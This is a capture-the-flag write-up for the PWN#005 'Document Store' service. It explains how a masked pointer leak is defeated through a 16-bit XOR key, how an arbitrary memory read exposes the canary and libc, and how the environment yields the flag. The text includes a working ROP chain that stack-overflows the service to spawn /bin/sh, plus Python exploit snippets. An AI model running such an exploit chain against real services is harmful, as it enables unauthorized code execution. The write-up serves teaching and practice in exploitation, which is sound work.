# PWN#005 — 16-bit XOR leak to arbitrary read and shell

**Flag:** `CTF{19a2c93af520a379ebc2b3f4528b103a}` · **Files:** no artifacts were provided; `document_store.memdump` (40 991 B, sha256 `a7996c9bab738eb97f538d2f9e49cb721e8da59f23c156543c59f249cefcf955`) is a memory image **dumped through the bug itself** · **Target:** `169.58.126.107:5008`

## Challenge

The card reads `PWN#005`, objective "Get a shell on the remote host and read the flag", service at
`169.58.126.107 5008`, flag format `CTF{}`. Unlike [pwn001](PWN001.en.md) and
[pwn002](PWN002.en.md), this challenge ships **no binary, no libc and no loader** — only a TCP
port. Everything below therefore runs on two parallel tracks: black-box behaviour measurement, and
building up a memory-read primitive so the artifact can be "self-issued".

The service:

```text
=== Document Store ===
1) Peek memory  2) Checkout
>
```

Besides the two visible entries there are **two hidden options, `7` and `9`**, both printing
`session: 0x%016lx 0x%016lx`. The menu is parsed with `strtol(buf, NULL, 0)`, so `7`, `07`, `0x7`, `+7`
and ` 7` all reach option 7 (`09` is invalid because it is octal). Every connection is a fresh process:
PIE base, stack and canary all change.

## Analysis

### 1. `Checkout` is a stack overflow with a canary

Option `2` prints `Leave a note before you go: ` and reads into a stack buffer. The exact boundary,
measured by sending payloads of increasing length and watching whether the process survives:

| payload length | result |
| --- | --- |
| 1..72 | returns to the menu |
| 73 | returns to the menu **only if** byte 72 is `0x00` (30/30) |
| 74 and up | **always** dies, for every value at byte 73 |

Byte 72 must be `0x00` and byte 73 is random per connection — the signature of a **stack canary**
(`fs:0x28`, least significant byte always `0x00`). Two further checks rule out "offset 72 is the return
address":

- 3072 attempts with a random byte 73 → 9 survivors, i.e. ~1/256.
- A stratified test of 4 high nibbles × 256 attempts → `0/256`, `0/256`, `2/256`, `1/256`, hits scattered.

If offset 72 were the return address, a page-aligned PIE base forces bits 8..11 to be constant, so
**one** nibble would have to show ~16/256 hits. None does ⇒ offset 72 is the canary. Layout:

```text
note[72]  @ rbp-0x50      (offset 0..71)
canary    @ rbp-0x08      (offset 72..79)
saved rbp @ rbp+0x00      (offset 80..87)
ret addr  @ rbp+0x08      (offset 88..95)
```

The canary is fresh per connection (a byte that once hit gave 0/40 later), so this is not a fork server
and the canary cannot be brute-forced.

### 2. The two hidden options print `ptr ^ key`, and the key is only 16 bits

Options 7 and 9 print two XOR-masked pointers. Over 120 connections:

- `v1(7) ^ v1(9) = 0xb` **constant 120/120** ⇒ the two pointers are 11 bytes apart and share the key.
- `v_a ^ v_b` varies, but **only in bits 12..19**, exactly in the `(x) ^ (x+3)` shape produced by the
  carry chain of a page-aligned PIE base ⇒ the three pointers sit at **fixed** offsets in the image.
- `v_d` is a stack address (`0x7ffc...`).
- A burst of 8 connections within one second produced 8 different keys; bit 63 of the key varies ⇒ the
  key is not two 31-bit `rand()` values glued together; brute-forcing a PID-seeded PRNG (300k seeds ×
  5 variants) found nothing; a Z3 model is **underdetermined** (many solutions).

But the real key is not a full 64-bit random value. It is **two bytes** from `getrandom(buf, 2, 0)`,
XORed **byte by byte** into the pointer:

```text
PIE+0x453  getrandom(buf, 2, 0)                            ; two random bytes
PIE+0x479  mov word ptr [rip+0x2bba], ax                    ; 16-bit key at PIE+0x303a
PIE+0x0aa  mask helper:
  PIE+0xcd   movzx eax, word [rip+0x2f66]                   ; key
  PIE+0xd4   mov [rbp-0x1e], al                             ; key_lo
  PIE+0xe2   mov [rbp-0x1d], al                             ; key_hi
  PIE+0xf3   movzx eax, byte [rbp+rax-0x10]                 ; ptr[i]
  PIE+0x101  and eax, 1                                     ; i & 1
  PIE+0x10e  xor eax, edx
  PIE+0x117  mov [rbp+rax-0x10], dl                         ; ptr[i] ^= key[i & 1]
```

Because **every user-space pointer has bytes 6 and 7 equal to zero**, the top 16 bits of the leaked
value *are* the key. All it takes is:

```python
h   = leaked >> 48
key = h | (h << 16) | (h << 32) | (h << 48)   # two bytes repeated
ptr = leaked ^ key
```

Unmasking yields four values, stable across 6/6 connections (`leak-samples.txt`):

| value | meaning |
| --- | --- |
| `p_a` | `PIE + 0x4e6` — return address inside `main` (after `call session7`) |
| `p_b` | `PIE + 0x3018` — a data pointer |
| `p_c` | `PIE + 0x4ed` — return address inside `main` (after `call session9`) |
| `p_d` | `0x7ffc...` — stack address, the `rbp` **shared by every callee of `main`** |

`p_a ^ p_c = 0xb` and `p_a ^ p_b = 0x?4fe` match fixed offsets over a page-aligned base exactly as
predicted in section 2.

### 3. `Peek memory` is a real arbitrary read

Option 1 asks for `Address: ` and `Length: `, both read by the helper at `PIE+0x147`
(`printf(prompt)`, `read(0, buf, 0x1f)`, `strtol(buf, NULL, 0)`), then:

```text
PIE+0x1f9  cmp qword [rbp-0x10], 0
PIE+0x224  jle  invalid            ; len <= 0
PIE+0x226  cmp qword [rbp-0x10], 0x400
PIE+0x22e  jle  do_peek            ; len <= 1024
PIE+0x241  mov rdx, [rbp-0x10]     ; len
PIE+0x245  mov rax, [rbp-0x18]     ; addr
PIE+0x24c  mov edi, 1
PIE+0x251  call write@plt          ; write(1, addr, len)
PIE+0x256  ...                     ; write(1, "\n", 1)
```

A bad address makes `write` return `EFAULT` and **does not crash** — which is why the first analysis
round saw this function as "silent for every address". Reading at `p_a & ~0xfff` returns `\x7fELF`:

```text
peek(PIE+0x000, 4) -> 7f 45 4c 46        # PIE base = p_a & ~0xfff
```

From there the whole mapping can be dumped (`[PIE-0x5000, PIE+0x501F]`, 40 991 bytes) — that is
`document_store.memdump`. Note the author **NOPed the 0x40-byte ELF header** (bytes 0..3 are
`\x7fELF`, the rest `0x90`), so the image does not parse with `readelf`/`objdump`; the disassembly in
`disasm.txt` reads it directly at known offsets.

### 4. The flag lives in the environment

`entrypoint.sh` exports it, so `FLAG=CTF{...}` sits in the initial stack's environment, just above the
frames. Scanning upward from `p_d` with the arbitrary read:

```text
@p_d+0xc85  b'/challenge\x00FLAG=CTF{19a2c93af520a379ebc2b3f4528b103a}\x00SOCAT_PID=...'
```

That is the shortest path in this challenge: **unmask the leak → get a stack address → peek the
environment → flag**. No overflow, no shell.

## Attempts that failed

Full log in `notes.md`; the dead ends that were genuinely tried, with the evidence that killed them:

1. **Treating `Peek memory` as a stub** and scanning fixed addresses (0, 0x400000, `0x7ffffffde000`,
   `0xffffffffff600000`, the whole stack window `0x7ffffffff000 - i*0x1000`, ~3000 probes) → silent
   100% of the time. The real cause is `EFAULT`, not a stub; it only became visible once a valid address
   existed (section 3).
2. **Treating offset 72 as the return address** (no canary) and scanning 2-byte partial overwrites
   around the return site (~5000 probes). Every 74+ byte probe is killed by `__stack_chk_fail` before
   the `ret`, so the "landings" observed were canary-byte coincidences (1/256). Verified with a
   stratified test: 4 nibbles × 256 attempts → scattered hits, no nibble near 16/256
   (`canary-bypass.log` also shows the control: wrong canary → `EOF`).
3. **Solving the mask algebraically / by brute force**: the `ptr ^ key` model with a 64-bit random key
   is underdetermined (Z3 returns many solutions), PID seeding finds nothing, and a same-second burst
   yields different keys. DEAD — the key is only 16 bits applied byte-wise, not a 64-bit random.
4. **Using the binary's own gadgets**: the binary has only `leave; ret` and `ret` — no `pop rdi`,
   `pop rsi`, `pop rax` or `syscall` (byte-pattern scan over `document_store.memdump`). DEAD — libc
   gadgets are required.
5. **Needing the libc base**: no libc was shipped. Instead a libc code pointer `P` is read from
   `p_d+0x38` through the arbitrary read, and gadgets are found by pattern-scanning around `P` — the
   offsets relative to `P` are constant because both live in libc. No base, no exact libc version.
6. **`pop rdx; ret`** to set `envp = NULL` for `execve`: not present in the ±0x20000 window. The chain
   still works: `execve` with `rdx` left over from `printf` does not fault on this build
   (`shell-output.txt`), so the gadget is not needed.

## Solution

`getflag.py` contains both paths: the shell path (true to "get a shell") and the environment path
(fallback, and also the shortest route).

**Step 1 - Unmask the leak.** Send `7` then `9`, take the four values, derive `key` from the top 16 bits
and XOR back:

```python
h   = a >> 48
key = h | (h << 16) | (h << 32) | (h << 48)
pa, pb, pc, pd = a ^ key, b ^ key, c ^ key, d ^ key
base = pa & ~0xfff                       # PIE base
assert v.peek(base, 4) == b"\x7fELF"     # base confirmed
```

**Step 2 - Read the canary and a libc pointer.** `p_d` is the shared `rbp`, so the canary sits at
`p_d-8`:

```python
canary   = u64(v.peek(pd - 8, 8))        # e.g. 0x0d10d1568bde9000, low byte 0x00
orig_rbp = u64(v.peek(pd, 8))
```

The libc pointer `P` is read from `[p_d+0x38]` (a `0x7f...` value, not page-aligned, far from `p_d`).

**Step 3 - `execve("/bin/sh")` chain.** The buffer is at `p_d-0x50`, the return address at `p_d+8`, and
`read` is capped at `0x100` bytes, so the chain must be compact (168 bytes):

```python
binsh = pd - 0x50 + 160                  # "/bin/sh" placed inside the buffer
chain = b"".join(p64(x) for x in (
    P + 0xA42,   binsh,        # pop rdi; ret  -> &"/bin/sh"
    P - 0x14C,   0,            # pop rsi; ret  -> NULL
    P + 0x1A411, 59,           # pop rax; ret  -> SYS_execve
    P + 0x22,                  # syscall
))
payload = b"A"*72 + p64(canary) + p64(orig_rbp) + chain
payload = payload.ljust(160, b"\x00") + b"/bin/sh\x00"
```

Gadget offsets (relative to `P`, found by byte-pattern scanning through the arbitrary read —
`gadget-scan.log`):

```text
pop rdi; ret  = P + 0xa42
pop rsi; ret  = P - 0x14c
pop rax; ret  = P + 0x1a411
syscall       = P + 0x22
```

The binary has **no seccomp** (imports are only `setvbuf, strtol, printf, write, getrandom, exit,
__stack_chk_fail, __libc_start_main, __cxa_finalize`), so `execve` succeeds and the shell is real.

**Step 4 - Read the flag.** After `execve` the socket is `/bin/sh`'s stdin/stdout:

```text
echo SHELL_OK; id; cat /flag/flag.txt
```

**Fallback (and also the shortest route).** If the chain ever breaks, only step 1 is needed, then scan
the environment:

```python
addr = (pd + 0x200) & ~0x3ff
while addr < pd + 0x20000:
    chunk = v.peek(addr, 1024)
    if b"FLAG=" in chunk: ...        # FLAG=CTF{...}
    addr += 1024
```

## Reproduction

Requires: the service at `169.58.126.107:5008` to be alive, Python 3 (stdlib only). No binary, libc or
loader from the challenge is needed — `document_store.memdump` is only there to re-read the
disassembly.

```bash
cd pwn005
python getflag.py
```

The script performs three rounds on **one** connection: leak options 7/9 → unmask → peek the base,
canary and `P` → send the 168-byte payload → `cat /flag/flag.txt`. If the service is down, this
reproduction step cannot run; every value quoted above comes from the recorded logs.

To re-check the image without the service:

```bash
sha256sum document_store.memdump
python - <<'EOF'
from capstone import *
d = open("document_store.memdump","rb").read()
# image[0] == PIE-0x5000; e.g. the mask helper at PIE+0xaa -> offset 0x50aa
for i in Cs(CS_ARCH_X86, CS_MODE_64).disasm(d[0x50aa:0x5100], 0x50aa):
    print("PIE%+06x: %-20s %s %s" % (i.address-0x5000, i.bytes.hex(), i.mnemonic, i.op_str))
EOF
```

On this release the output starts with the byte-wise XOR loop of the mask helper:
